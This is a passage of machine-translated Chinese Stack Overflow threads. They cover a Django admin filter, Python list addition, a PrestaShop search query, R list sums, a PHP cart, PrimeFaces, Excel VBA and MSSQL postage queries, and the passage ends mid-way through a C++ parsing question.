自 Django 1.8 以来，有：[`admin.RelatedOnlyFieldListFilter`](https://docs.djangoproject.com/en/1.8/ref/contrib/admin/#django.contrib.admin.ModelAdmin.list_filter)

示例用法是：

```
class BookAdmin(admin.ModelAdmin):
    list_filter = (
        ('author', admin.RelatedOnlyFieldListFilter),
    ) 
```

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2014-03-28T09:10:34.917

我会像这样在 darklow 的代码中更改查找：

```
def lookups(self, request, model_admin):
    users = User.objects.filter(id__in = model_admin.model.objects.all().values_list('user_id', flat = True).distinct())
    return [(user.id, unicode(user)) for user in users] 
```

这对数据库来说要好得多；）

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2015-04-07T20:55:12.720

伟大的@darklow 答案的通用可重用版本：

```
def make_RelatedOnlyFieldListFilter(attr_name, filter_title):

    class RelatedOnlyFieldListFilter(admin.SimpleListFilter):
        """Filter that shows only referenced options, i.e. options having at least a single object."""
        title = filter_title
        parameter_name = attr_name

        def lookups(self, request, model_admin):
            related_objects = set([getattr(obj, attr_name) for obj in model_admin.model.objects.all()])
            return [(related_obj.id, unicode(related_obj)) for related_obj in related_objects]

        def queryset(self, request, queryset):
            if self.value():
                return queryset.filter(**{'%s__id__exact' % attr_name: self.value()})
            else:
                return queryset

    return RelatedOnlyFieldListFilter 
```

用法：

```
class CityAdmin(ModelAdmin):
    list_filter = (
        make_RelatedOnlyFieldListFilter("country", "Country with cities"),
    ) 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2015-05-07T07:41:36.963

这是我对 Django 1.4 的通用和可重用实现的看法，如果你碰巧卡在那个版本上。它的灵感来自现在是 Django 1.8及更高版本的一部分的[内置版本。](https://github.com/django/django/blob/1.8/django/contrib/admin/filters.py#L425)此外，将其适应 1.5-1.7 应该是一项相当小的任务，主要是查询集方法在其中更改了名称。我已将过滤器本身放在`core`我拥有的应用程序中，但您显然可以将它放在任何地方。

**执行：**

```
# myproject/core/admin/filters.py:

from django.contrib.admin.filters import RelatedFieldListFilter

class RelatedOnlyFieldListFilter(RelatedFieldListFilter):
    def __init__(self, field, request, params, model, model_admin, field_path):
        self.request = request
        self.model_admin = model_admin
        super(RelatedOnlyFieldListFilter, self).__init__(field, request, params, model, model_admin, field_path)

    def choices(self, cl):
        limit_choices_to = set(self.model_admin.queryset(self.request).values_list(self.field.name, flat=True))
        self.lookup_choices = [(pk_val, val) for pk_val, val in self.lookup_choices if pk_val in limit_choices_to]
        return super(RelatedOnlyFieldListFilter, self).choices(cl) 
```

**用法：**

```
# myapp/admin.py:

from django.contrib import admin
from myproject.core.admin.filters import RelatedOnlyFieldListFilter
from myproject.myapp.models import MyClass

class MyClassAdmin(admin.ModelAdmin):
    list_filter = (
        ('myfield', RelatedOnlyFieldListFilter),
    )

admin.site.register(MyClass, MyClassAdmin) 
```

如果您稍后更新到 Django 1.8，您应该能够更改此导入：

```
from myproject.core.admin.filters import RelatedOnlyFieldListFilter 
```

对此：

```
from django.contrib.admin.filters import RelatedOnlyFieldListFilter 
```

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2015-03-24T13:57:45.860

@andi，感谢您告知 Django 1.8 将具有此功能的事实。

我查看了它是如何实现的，并基于适用于 Django 1.7 的创建版本。这比我之前的答案更好，因为现在您可以将此过滤器与任何外键字段重用。仅在 Django 1.7 中测试，不确定它是否适用于早期版本。

这是我的最终解决方案：

```
from django.contrib.admin import RelatedFieldListFilter

class RelatedOnlyFieldListFilter(RelatedFieldListFilter):
    def __init__(self, field, request, params, model, model_admin, field_path):
        super(RelatedOnlyFieldListFilter, self).__init__(
            field, request, params, model, model_admin, field_path)
        qs = field.related_field.model.objects.filter(
            id__in=model_admin.get_queryset(request).values_list(
                field.name, flat=True).distinct())
        self.lookup_choices = [(each.id, unicode(each)) for each in qs] 
```

用法：

```
class MyAdmin(admin.ModelAdmin):
    list_filter = (
        ('user', RelatedOnlyFieldListFilter),
        ('category', RelatedOnlyFieldListFilter),
        # ...
    ) 
```

# iphone - 从键盘禁用国际键盘选择按钮

> ID：12215761
> 
> 赞同：1
> 
> 时间：2012-08-31T12:52:20.273
> 
> 标签：iphone, objective-c, ios, uikeyboard

是否可以通过应用程序从默认键盘禁用国际键盘选择按钮？如果是的意思，请给出一些想法来做同样的事情。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T12:58:24.727

我不这么认为。它是一个主要的系统功能。当您在设置中启用多个键盘布局时，此按钮会自动出现。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-12-09T11:45:53.853

在 iOS 6 中无法隐藏键盘。而是限制语言列表中的语言

打开模拟器设置应用程序->常规->国际->语言。在此处选择您的语言和键盘将有所需的字母。

# mongodb - 带有oData的Mongodb多值，收集数据丢失

> ID：12215765
> 
> 赞同：0
> 
> 时间：2012-08-31T12:52:30.077
> 
> 标签：mongodb, asp.net-web-api, odata, mongodb-.net-driver

我正在尝试使用 MongoDB 作为我的数据，并让 oData 在 C# ASP.Net 中生成提要。我的课看起来像这样：

```
public class Student
{
    String FirstName;
    String LastName;
    list<course> classes;
} 

public class Course
{
    string id;
    string name;
} 
```

我可以在 mongodb 中添加数据，然后取回 JSON。但是当我通过 oData 获取提要时，只是不显示收集过程。任何帮助将不胜感激。谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-09T21:26:01.760

您可以查看我的博客文章中描述的 MongOData MongoDB OData 提供程序：http: [//bloggingabout.net/blogs/vagif/archive/2012/05/19/expose-mongodb-data-as-odata-feed-using -mongodata-provider.aspx](http://bloggingabout.net/blogs/vagif/archive/2012/05/19/expose-mongodb-data-as-odata-feed-using-mongodata-provider.aspx)

它仍在开发中，但我已在多个项目中成功使用它。

# python - Python逐元素就地添加

> ID：12215766
> 
> 赞同：1
> 
> 时间：2012-08-31T12:52:34.750
> 
> 标签：python

这是场景：给定*n 个*整数列表（长度相同）和一个累加器（实际上长度相同），就地累加元素总和。就地约束在这里，因为我在列表的字典中累积值（嗯......不太清楚，请参见下面的示例）

**编辑**：我正在寻找不涉及 numpy 的解决方案

```
# My lists are long (they are actually pixels in 1000x1000 images)
# but I keep l low for the sake of the example
l = 5

# Values here are arbitrary and won't be repeated in the real word
# e.g. list 1 might be [41,15,0,2,3], etc.
lists = [
   {'id': 1, 'values': [12]*l},
   {'id': 2, 'values': [42]*l},
   {'id': 2, 'values': [25]*l},
   {'id': 1, 'values': [6]*l},
]

maps = {
  1: [0]*l,
  2: [0]*l
}

for item in lists:
  # Get the "target" for this list
  target = maps[item['id']]

  # Element-wise addition of item['values'] to target here!

  # This won't work
  target = map(lambda x,y:x+y, target, item['values'])
  # This neither
  target = [(x+y) for x,y in itertools.izip(target,item['values'])]

  # For either of the previous to work, I need to re-assign
  # the result to 'target', like so
  maps[item['id']] = target 
```

虽然它有效并且我可以专业地接受它，但我个人不能。

谁能让我今晚睡得更好？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T12:57:07.270

看看[numpy](http://numpy.scipy.org/)。你的代码可以写成：

```
import numpy as np

l = 5
lists = [
   {'id': 1, 'values': np.array([12]*l)},
   {'id': 2, 'values': np.array([42]*l)},
   {'id': 2, 'values': np.array([25]*l)},
   {'id': 1, 'values': np.array([6]*l)},
]

maps = {
  1: np.zeros(l),
  2: np.zeros(l)
}

for item in lists:
   maps[item['id']] += item['values'] 
```

您也可以将其调整为 2D（图像），而无需进一步循环。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T12:59:11.010

看起来您正在尝试将字典列表用作表格，您应该考虑使用专业数据类型（已为此进行了优化）。我的建议是[熊猫的数据框](http://pandas.pydata.org/pandas-docs/stable/dsintro.html#dataframe)。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-31T13:23:57.590

虽然我没有花时间真正弄清楚您的代码，但在我看来，这样的事情可能会起作用：

```
target[:] = [(x+y) for x,y in itertools.izip(target,item['values'])] 
```

这里唯一的区别是`target[:]`代替`target`. 当您分配给列表的一部分时，您会在适当的位置进行分配。考虑：

```
a = [1,2,3,4]
a[1:3] = ["foo","bar"]
print(a)  # [1, 'foo', 'bar', 4] 
```

这会创建一个临时列表（至少在 CPython 中——也许像带有 JIT 编译的 pypy 这样的东西可以优化它......）。为避免这种情况，您可以使用生成器（尽管您的代码执行速度可能会受到影响）：

```
a[1:3] = (x for x in iterable) 
```

因此，您的最终解决方案可能是（*未经测试*）：

```
target[:] = ((x+y) for x,y in itertools.izip(target,item['values'])) 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-31T14:09:37.347

如果您在添加时确实尝试避免使用临时对象`target`，为什么不直接执行以下操作：

```
for (i, v) in enumerate(item['values']):
    target[i] += v 
```

在你的循环中？并且当您`target`就地修改时，无需将其重新分配给`maps[item["id"]]`...

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-31T13:06:55.730

这种混乱是否源于重新分配变量`target`。考虑以下：

```
x = [3]
target = x[0] # target = 3
target = 4
print x # prints [3] # x has not been changed 
```

.

*您可以在一行中进行这种就地更改，而不是分配给虚拟变量`target`。*就像是：

```
maps[item['id']] = map(lambda x,y:x+y, maps[item['id']], item['values']) 
```

# refresh - 如何在 Watir-Webdrive 中刷新页面？

> ID：12215770
> 
> 赞同：11
> 
> 时间：2012-08-31T12:52:51.450
> 
> 标签：refresh, watir, watir-webdriver

如何使用 watir-webdrive 刷新页面？我试过他们在这里说的话：[http](http://watirwebdriver.com/sending-special-keys/) ://watirwebdriver.com/sending-special-keys/ ，但没有运气。

```
browser.send_keys :f5 
```

还有其他建议吗？谢谢

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-08-31T13:14:34.333

你可以做：

```
browser.refresh 
```

请参阅[文档](http://rubydoc.info/gems/watir-webdriver/Watir/Browser#refresh-instance_method)。

# visual-studio - 如何在 Visual Studio 中从一个项目构建多个体系结构，而从另一个项目构建多个体系结构？

> ID：12215774
> 
> 赞同：1
> 
> 时间：2012-08-31T12:53:03.987
> 
> 标签：visual-studio, build

我的解决方案由 Native C++ DLL 项目和 C# 类库组成。C# 类库是原生 DLL 的包装器。

类库是 AnyCPU，native 里面有 Win32 和 x64 架构。基本上，我需要先构建本机 DLL 的 32 位和 64 位版本，然后是 C# 库。这是一个严格的依赖关系，因为 DLL 作为资源嵌入到 C# 库中。

1.  如果可以从 Visual Studio 制作，该怎么做？
2.  如果不可能，如何使用 msbuild 来做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T17:19:57.550

这是你应该做的：

1.  为您的 Native DLL 定义两种不同的构建配置，一种用于 Win32，另一种用于 Win64。
2.  假设这两个构建将它们生成的 DLL 放入两个单独的目录中，即**build32**和**build64**。
3.  也为您的 C# 库定义两种不同的构建配置。一个用于 32 位（配置 A），一个用于 64 位（配置 B）。在配置 A 中添加对**build32**中 dll 的引用，在配置 B 中添加对来自 build64 的本机 DLL 的引用**。**
4.  现在让您的构建器首先编译您的本机 dll 的所有配置，然后再编译 C# 库。
5.  那时一切都会好起来的。！！！

# replace - 用 % 替换 php 中的空格

> ID：12215775
> 
> 赞同：0
> 
> 时间：2012-08-31T12:53:08.243
> 
> 标签：replace, whitespace, sign

我需要修改默认的 prestashop 数据库查询。我尝试了以下方法：

```
public function ajaxProcessCheckProductName()
{
    if ($this->tabAccess['view'] === '1')
    {
        $search = Tools::getValue('q'); /* in this variable, i wish subsitute the space with % */
        $searchmod = str_replace(" ", "%", $search);
        $id_lang = Tools::getValue('id_lang');
        $limit = Tools::getValue('limit');
        $result = Db::getInstance()->executeS('
            SELECT DISTINCT pl.`name`, p.`id_product`, pl.`id_shop`
            FROM `'._DB_PREFIX_.'product` p
            LEFT JOIN `'._DB_PREFIX_.'product_lang` pl
                ON (pl.`id_product` = p.`id_product` AND pl.`id_lang` = '.(int)$id_lang.')
            WHERE pl.`name` LIKE "%'.pSQL($searchmod).'%"
            GROUP BY pl.`id_product`
            LIMIT '.(int)$limit);
        die(Tools::jsonEncode($result));
    }
} 
```

我希望`kawasaki racing filter`用 % 替换变量中的空格，这样我就可以使用完整的通配符对 db 进行查询...

示例：用户搜索`kawasaki racing filter`，我希望将其替换为`kawasaki%racing%filter`so，查询将是`%kawasaki%racing%filter%`...

该方法似乎正确吗？它现在不起作用:(

有人能帮我吗？提前致谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T21:28:12.510

它对您不起作用的最可能原因是，如果您在数据库中`%kawasaki%racing%filter%`搜索 ，它将按顺序搜索包含所有这些单词的条目。

我的预感是您希望它在字符串中的任何位置找到包含这三个单词的条目，但是您这样做的方式意味着它们必须以与它们在查询中输入的顺序相同的顺序出现。

您最好将字符串拆分为单独的单词，并独立搜索每个单词。

例如

```
... WHERE field LIKE '%kawasaki%'
      AND field LIKE '%racing%'
      AND field LIKE '%filter%' 
```

这将搜索包含所有三个单词的记录，但顺序不限。如果您想查找其中任何一个单词，而不是全部三个单词，请替换`AND`为`OR`。

还：

*   如有必要，不要忘记转义输入字符串。（即防止SQL注入攻击，如果输入包含引号字符等，防止查询中断）

*   如果可能，我建议避免在查询中使用通配符。特别是在字符串的开头。这是因为它们会使查询变得非常慢（数据库必须读取每条记录，并为每条记录解析相关字段的全部内容：这是您可以在单个表上执行的最慢查询，如果您'同时在做`JOIN`，情况会更糟）。

在某些情况下，通配符搜索很有用，但如果您需要进行大量文本搜索，MySQL（和其他数据库；您没有指定您使用的数据库系统）确实有替代选项。

最简单的选择是将关键字存储在单独的表格中。您可以将它们视为标签。然后您可以直接查询确切的单词。

如果您需要更多，您可以查看 MySQL 的[“全文搜索”功能](http://dev.mysql.com/doc/refman/5.0/en/fulltext-search.html)，它可以直接替代慢速通配符搜索。

但即使这样有时也会很慢，所以如果你真的想要快，请查看[Sphinx](http://sphinxsearch.com/)。这需要做更多的工作，但如果做对了，它会让您的搜索速度快如闪电。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T13:15:42.837

确保您的 Tools::getValue 不返回 html 字符串，例如。`&nbsp;`在你的情况下。试试 var_dumpin 你的 Tools:getValue 看看真正的输出是什么。

# r - 在R中将列表中的各个数据框一起添加

> ID：12215785
> 
> 赞同：1
> 
> 时间：2012-08-31T12:53:37.723
> 
> 标签：r, list, dataframe, add

我在 R 中有 2 个数据框列表（每个列表中的相应数据框大小相同）。是否可以将每个列表中的相应数据帧添加到一行中。

例如说我们有

```
list1 <- list('a' = data.frame('x'=c(0,1),'y'=c(2,0)), 'b' = data.frame('x'=c(1,1),'y'=c(1,1)))
list2 <- list('a' = data.frame('x'=c(1,2),'y'=c(1,1)), 'b' = data.frame('x'=c(0,1),'y'=c(0,1))) 
```

所以 list1 是：

```
$a
 x y
 0 2
 1 0

$b
 x y
 1 1
 1 1 
```

而 list2 是：

```
$a
 x y
 1 1
 2 1

$b
 x y
 0 0
 1 1 
```

最终输出将是：

```
$a
 x y
 1 3
 3 1

$b
 x y
 1 1
 2 2 
```

显然可以通过以下方式在两条单独的行中执行此操作：

```
listOutput <- list()
listOutput[['a']] <- list1[['a']] + list2[['a']]
listOutput[['b']] <- list1[['b']] + list2[['b']] 
```

但是有没有一种简单的方法可以在一行中做到这一点，也许使用 lapply？

谢谢

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-31T13:14:19.637

这是一种保留名称的方法：

```
mapply(function(x, y) x + y, list1, list2, SIMPLIFY=FALSE, USE.NAMES=TRUE) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-31T12:58:49.440

这是一个非常针对您的问题的解决方案。换句话说，它假设：

1.  你有两个列表
2.  每个列表都有相同的元素
3.  元素可以转换为矩阵

编码：

```
lapply(1:2, function(i)list1[[i]] + list2[[i]])
[[1]]
  x y
1 1 3
2 3 1

[[2]]
  x y
1 1 1
2 2 2 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-31T13:17:12.943

从理论上讲，您应该能够使用`unlist`and的组合来做到这一点`relist`，但它似乎不像记录的那样工作：

```
relist(unlist(list1)+unlist(list2),skeleton=list1)
$a
   x    y <NA> <NA> 
   1    3    3    1 

$b
   x    y <NA> <NA> 
   1    2    1    2 
```

# php - 在php中检索数据输入到新页面

> ID：12215789
> 
> 赞同：0
> 
> 时间：2012-08-31T12:53:58.860
> 
> 标签：php, html

当我单击 cart.php 中的提交时，我尝试将数据从另一个页面打印到新页面

这是我的代码

购物车.php

```
function paypal_items(){
    $num = 0;
    foreach ($_SESSION as $name => $value){
        if ($value !=0){
            if (substr($name, 0, 5) == "cart_"){
                $id = substr ($name, 5, strlen($name)-5);
                $get = mysql_query ('SELECT id, name, price FROM menu WHERE id='.mysql_real_escape_string((int)$id));
                while ($get_row = mysql_fetch_assoc($get)) {
                    $num++;
                    echo '<input type="hidden" name="item_number_'.$num.'" value="'.$id.'">';
                    echo '<input type="hidden" name="item_name_'.$num.'" value="'.$get_row['name'].'">';
                    echo '<input type="hidden" name="amount_'.$num.'" value="'.$get_row['price'].'">';
                    echo '<input type="hidden" name="quantity_'.$num.'" value="'.$value.'">';
                }
            }
        }
    }
}

function cart() {
    $total = 0;
    foreach($_SESSION as $name => $value) {
        if ($value>0) {
            if (substr($name, 0, 5) == 'cart_'){
                $id = substr($name, 5, (strlen($name)-5));
                $get = mysql_query('SELECT id, name, price FROM menu WHERE id=' .mysql_real_escape_string((int)$id));
                while ($get_row = mysql_fetch_assoc($get)){
                    $sub = $get_row['price'] * $value;
                    $target_data = $get_row['name'].' x '.$value.' @ $'.number_format($get_row['price'], 2).' = $'.number_format($sub, 2);
                    $_SESSION['target_data'] = $target_data;
                    echo $get_row['name'].' x '.$value.' @ $'.number_format($get_row['price'], 2).' = $'.number_format($sub, 2).' <a href="cart.php?remove='.$id.'">[-]</a> <a href="cart.php?add='.$id.'">[+]</a> <a href="cart.php?delete='.$id.'">[Delete]</a><br />' ;
                }
            }
            $total += $sub;
        }
    }
    if ($total == 0){
        echo "Your Cart Is Empty";
    }
    else {
        echo "<p>Total : $".number_format($total, 2).'</p>';

        <p>
        <form action="bill.php" method="post">
        <?php paypal_items(); ?>
        <input type="submit" value="submit" />
        </form>
        </p>
    }
} 
```

我尝试从功能 cart() 打印出这些数据

```
 echo $get_row['name'].' x '.$value.' @ $'.number_format($get_row['price'], 2).' = $'.number_format($sub, 2).' <a href="cart.php?remove='.$id.'">[-]</a> <a href="cart.php?add='.$id.'">[+]</a> <a href="cart.php?delete='.$id.'">[Delete]</a><br />' ; 
```

使用此代码，我尝试检索所有数据输入

比尔.php

```
<?php
session_start();
echo $_SESSION['target_data'] .'<br />';
print_r($_POST);
?> 
```

但是我得到的输出是这样的（当我点击提交时我有两个数据要显示）

```
 Milk Tea x 9 @ $1.99 = $17.91
 Array ( [item_number_1] => 2 [item_name_1] => Ayam Penyet [amount_1] => 6.99 [quantity_1] => 8 [item_number_2] => 1 [item_name_2] => Milk Tea [amount_2] => 1.99 [quantity_2] => 9 ) 
```

我想要的预期输出就像

```
 Milk Tea x 9 @$1.99 = $17.91
 Ayam Penyet x 8 @6.99 = $55.92 
```

有谁知道如何解决这个问题？？

谢谢 ：）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T15:14:22.670

我会更改您输入的名称：

```
while ($get_row = mysql_fetch_assoc($get)) {
    $num++;
    echo '<input type="hidden" name="items['.$num.'][item_number]" value="'.$id.'">';
    echo '<input type="hidden" name="items['.$num.'][item_name]" value="'.$get_row['name'].'">';
    echo '<input type="hidden" name="items['.$num.'][amount]" value="'.$get_row['price'].'">';
    echo '<input type="hidden" name="items['.$num.'][quantity]" value="'.$value.'">';
} 
```

使用这些项目名称，PHP 将接收作为关联数组的值，看起来更像这样：

```
Array (
    [0] => Array (
        [item_number] => 2,
        [item_name] => "Ayam Penyet",
        [amount] => 6.99,
        [quantity] => 8
    ),
    [1] => Array(
        [item_number] => 1,
        [item_name] => "Milk Tea",
        [amount] => 1.99,
        [quantity] => 9
    )
) 
```

然后你可以像这样循环：

```
foreach ($_POST["items"] as $item)
{
    echo "{$item["item_name"]} x {$item["quantity"]} @\${$item["amount"]} = \$". number_format($item["quantity"] * $item["amount"], 2) ."<br />";
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T13:20:13.703

尝试使用**foreach()**循环：

```
foreach ($_POST as $key=>$value) {
  $printed .= $value .' ';
} 
echo $printed; 
```

上面的代码会将请求中的所有元素`POST`与空白空间“”连接起来。您可以进行额外的过滤，以便根据需要提取和排序发布的数据。例如：

```
foreach ($_POST as $key=>$value) {
  if (in_array($key, array('item_name','amount','quantity')))     
  $printed .= $value .' ';
} 
```

只有当它们属于**'item_name','amount','quantity' 时，**上面的代码才会连接发布的元素值。

# checkbox - Primefaces，带有 selectManyCheckbox 的滚动面板

> ID：12215793
> 
> 赞同：0
> 
> 时间：2012-08-31T12:54:13.230
> 
> 标签：checkbox, primefaces, scroll

我如何将 ap:scrollpanel 与复选框一起使用，我试过这样，但它不起作用：

```
 <p:scrollPanel mode="native" >
                <h:panelGrid>
                    <p:selectManyCheckbox value="#{localCobrancaBean.selectLocaisCobranca}"> 

                        <f:selectItems value="#{localCobrancaBean.listaLocalCobranca}" />  

                    </p:selectManyCheckbox>
                </h:panelGrid>

            </p:scrollPanel> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-20T10:22:01.927

在我看来，解决方案将滚动面板模式设置为原生。问题是关于滚动面板和selectmanycheckbox DOM的相对和绝对定位

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-01T12:36:48.037

我使用以下 JSF 进行了测试：

```
<p:scrollPanel mode="native">
    <h:panelGrid>
        <p:selectManyCheckbox>
            <f:selectItem itemLabel="asdfghgfd" />
            <f:selectItem itemLabel="zdvdfbdfvds" />
            <f:selectItem itemLabel="zdcdghnfw" />
            <f:selectItem itemLabel="sddfvdfv" />
        </p:selectManyCheckbox>
    </h:panelGrid>
</p:scrollPanel> 
```

结果是这样的：

![复选框垂直滚动](../Images/cb75055382e7dfd5262bb74bc73c09e2.png)

所以它似乎正在工作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-11-08T09:18:15.293

在我的应用程序中，我使用下面的代码集来获取带有滚动条的多个复选框列表：

```
<style type="text/css">
#productCategoryId label {
  float: inherit;
  font-size: 10px!important;
  font-weight: normal;
}
#productCategoryId table.formTable th, table.formTable td {
  padding: 0px 0px 0 0;
}
</style>

<div style="width:200px;height: 280px;overflow-y:scroll;overflow-x:hidden;border:1px solid #999;" max-height=280px>
             <h:selectManyCheckbox  id="productCategoryId" layout="pageDirection" style="width:200px" styleClass="changeId">
                  <f:selectItem itemValue="-1000" itemLabel="ALL" />
                  <f:selectItems value="#{lookup.list['RSM_LOOKUP']['PRODUCT_CATEGORY']}"/>
                </h:selectManyCheckbox >
            </div> 
```

# excel - 出现编译错误：检测到不明确的名称：Worksheet_Selection 更改

> ID：12215795
> 
> 赞同：0
> 
> 时间：2012-08-31T12:54:19.253
> 
> 标签：excel, vba

附件是我在工作表中使用的代码。这段代码直到最后一点都有效。最后一个代码的第一行是错误所在...`Private Sub Worksheet_SelectionChange(ByVal Target As Range)`我想知道为什么，它似乎适用于其他两个主题。

如果有人可以帮助它，将不胜感激。

```
Option Explicit

Dim PreviousValue

Private Sub Worksheet_Change(ByVal Target As Range)
    Dim sLogFileName As String, nFileNum As Long, sLogMessage As String
    Dim NewVal

    On Error GoTo Whoa

    Application.EnableEvents = False

    sLogFileName = ThisWorkbook.path & Application.PathSeparator & "Open Order Log.txt"

    If Not Target.Cells.Count > 1 Then
        If Target.Value <> PreviousValue Then
            If Len(Trim(Target.Value)) = 0 Then _
            NewVal = "Blank" Else NewVal = Target.Value

            sLogMessage = Now & Application.UserName & _
            " changed cell " & Target.Address & " from " & _
            PreviousValue & " to " & NewVal

            nFileNum = FreeFile
            Open sLogFileName For Append As #nFileNum
            Print #nFileNum, sLogMessage
            Close #nFileNum
        End If

    End If
LetsContinue:
    Application.EnableEvents = True
    Exit Sub
Whoa:
    MsgBox Err.Description
    Resume LetsContinue
End Sub

Private Sub Worksheet_SelectionChange(ByVal Target As Range)
    PreviousValue = Target(1).Value
End Sub

Private Sub Worksheet_SelectionChange(ByVal Target As Range)
    Dim sLogFileName As String
End Sub
    If FileLen(sLogFileName) > 3145728# Then
        sLogFileName = "Open Order Log - " & Format(Date, "dd-mm-yyyy")
        Name sLogFileName As "ThisWorkbook.path & Application.PathSeparator & \Temp\Open Order Log - " & Format(Date, "dd-mm-yyyy")
    End If
End Sub 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T12:56:59.330

您在 之后关闭`End Sub`了`Dim sLogFileName As String`，这是错误的。

```
Private Sub Worksheet_SelectionChange(ByVal Target As Range)
    Dim sLogFileName As String
    If FileLen(sLogFileName) > 3145728# Then
        sLogFileName = "Open Order Log - " & Format(Date, "dd-mm-yyyy")
        Name sLogFileName As "ThisWorkbook.path & Application.PathSeparator & \Temp\Open Order Log - " & Format(Date, "dd-mm-yyyy")
    End If
End Sub 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T20:32:44.757

您定义了以下代码：

```
Private Sub Worksheet_SelectionChange(ByVal Target As Range)
    PreviousValue = Target(1).Value
End Sub

Private Sub Worksheet_SelectionChange(ByVal Target As Range)
    Dim sLogFileName As String
    'other stuff
End Sub 
```

你有两个不同的*潜艇*都叫`Worksheet_SelectionChange`. 您需要确定要使用哪个并重命名/删除另一个。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-31T13:35:44.227

解决了这个问题，两个Subs`End Sub`被之前的帖子删除后同名...

```
Private Sub Size_Adjust(ByVal Target As Range)
    Dim sLogFileName As String
    If FileLen(sLogFileName) > 3145728# Then
        sLogFileName = "Open Order Log - " & Format(Date, "dd-mm-yyyy")
        Name sLogFileName As "ThisWorkbook.path & Application.PathSeparator & \Temp\Open Order Log - " & Format(Date, "dd-mm-yyyy")
    End If
End Sub 
```

# php - mssql - 何时/如何使用表变量

> ID：12215797
> 
> 赞同：0
> 
> 时间：2012-08-31T12:54:27.567
> 
> 标签：php, sql-server, variables, in-memory

我在 PHP 中编写脚本并使用 MsSQL 数据库。

我的脚本循环通过产品 ID 列表。对于每个 id，它都会创建一个产品数据对象。对于产品对象中的“邮资”字段，我调用了一个执行另一个查询的邮资类。

```
$products = $productsObj->getProducts($i, $limit);

foreach($products as $product)
{

echo $product['productName'] . '|';
echo $product['productDescription'] . '|';
echo $product['productPrice'] . '|';

$postage = $postageObj->getPostageCostforProduct(1, $product['weight'], $product['productPrice']);

echo $postage . '|';

} 
```

有人告诉我，如果有很多产品，我可能会使用“表变量”来加速这个过程。但是，我很难理解这将如何提供帮助以及如何实现这一点。我会用表变量查询替换邮资类中现有的邮资查询吗？如果是这样，这究竟是如何工作并帮助服务器加载的？

**编辑**

获取产品 ID 列表的查询是：

```
SELECT * FROM  FROM products WHERE category='$this->cat' 
```

然后我遍历它们中的每一个并为每个产品创建和对象。获取对象产品数据的查询是：

```
SELECT  p.id as prod_id, * FROM products AS p WITH(NOLOCK)
WHERE (p.id = '$this->prod_id') 
```

显示数据时，我调用以下查询来获取邮资：

```
SELECT Postage.postageName, Postage.Description AS postagedesc, Postage.id, Postage.qtyPer, Postage.pricePer, Postage.groupID, Groups.country_filter FROM  Postage 
LEFT OUTER JOIN Groups ON Postage.groupID = Groups.id 
WHERE  (Postage.minimumQty <= '$qty') AND (PostageRules.maximumQty >= '$qty') 
 (Postage.minPrice <= '$price') AND (Postage.maxPrice >= '$price') 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T19:08:42.090

您可以使用外部连接在单个查询中检索产品及其邮资成本值`Postage`：

```
SELECT
  pr.productName,
  pr.productDescription,
  pr.productPrice,
  pr.productWeight,
  po.postageName,
  po.Description AS postagedesc,
  po.id,
  po.qtyPer,
  po.pricePer,
  po.groupID,
  gr.country_filter
FROM products AS pr
  LEFT JOIN Postage AS po
    ON po.minimumQty <= pr.productWeight
   AND po.maximumQty >= pr.productWeight
   AND po.minPrice   <= pr.productPrice
   AND po.maxPrice   >= pr.productPrice
  LEFT JOIN Groups  AS gr
    ON po.groupID = gr.id
WHERE pr.category = '$this->cat' 
```

我想，这个查询可以在`productsObj`（比如 as `getProductsWithPostageCosts`）中以不同的名称定义，并可能像这样使用：

```
$products = $productsObj->getProductsWithPostageCosts($i, $limit);

foreach($products as $product)
{

echo $product['productName'] . '|';
echo $product['productDescription'] . '|';
echo $product['productPrice'] . '|';
echo $product['postageName'] . '|';
echo $product['postagedesc'] . '|';
...
echo $product['country_filter'] . '|';

} 
```

# c++ - 如何在 C/C++ 中解析字符串？

> ID：12215800
> 
> 赞同：0
> 
> 时间：2012-08-31T12:54:38.380
> 
> 标签：c++, c, parsing, scanf

我有一个包含以下行的文件：

```
25 1 0 0 0 0
27 1 0 0 0 0
20 0 0 0 0 0
32 1 0 0 0 0
23 1 0 0 0 0
16 0 0 0 0 0
28 1 0 0 0 0 
```

首先，我将第二列中 value=1 的每一行存储为字符串数组的元素。我通过 for 循环调用存储的元素，并将元素的内容解析为整数。如何在 C++ 中做到这一点？

```
#include <vector> 
#include <iostream>
#include <string>
using namespace std;
   .....
   .....
   .....
   .....
char line[100];
vector<string> vec_line;
string Vline;
int trimVal, compa, nil0, nil1, nil2, nil3;
  ......
  ......
  ......
//then store lines as strings in vec_line as required by the premise above
// after that, retrieve the contents of the elements of the vector
for (int iline=0; iline<vec_line.size(); iline++) {
   cout<<"iline  "<<iline<<"  vec_line[iline]";
   //then I want to parse contents of each string element and store them integer formats
